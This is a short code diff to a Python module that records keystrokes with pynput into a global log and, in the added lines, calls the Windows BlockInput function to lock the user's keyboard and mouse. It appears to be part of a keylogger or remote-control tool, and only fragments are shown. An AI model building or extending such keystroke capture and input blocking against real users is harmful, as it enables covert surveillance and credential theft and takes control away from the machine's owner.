@@ -1,4 +1,5 @@
 from pynput.keyboard import Listener
+from ctypes import windll
 
 key_log = ''
 listener = None
@@ -28,3 +29,6 @@ def get_key_log():
     global key_log
 
     return key_log
+
+def set_block_keyboard(block):
+    return windll.user32.BlockInput(block)
